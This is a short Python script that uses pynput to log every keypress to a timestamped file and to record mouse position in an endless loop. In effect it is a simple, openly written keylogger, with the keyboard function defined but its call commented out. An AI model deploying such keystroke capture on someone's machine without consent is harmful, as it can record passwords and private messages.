from pynput.keyboard import Key, Listener
from pynput.mouse import Controller
import logging


def Keyboard_logger():

    log_dir = "files/"

    logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

    def on_press(key):
        logging.info(str(key))

    with Listener(on_press=on_press) as listener:
        listener.join()


def mouse_pos():
    '''Opens a text file and dumps mouse data in it
        until the function exits
    '''
    # f_name = input("Enter file name: ")
    # # Rename file
    # f_name += ".txt"
    # # Opens txt file in files directory
    # f = open("files/{}".format(f_name), "w+")
    # # Init controller

    log_dir = "files/"
    logging.basicConfig(filename=(log_dir + "pointer_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

    mouse = Controller()
    while(1):
        #print( mouse.position )
        # Store location in txt file
        #f.write("{} \n".format(str(mouse.position)))
        logging.info(str(mouse.position))
    #f.close()

#Keyboard_logger()
mouse_pos()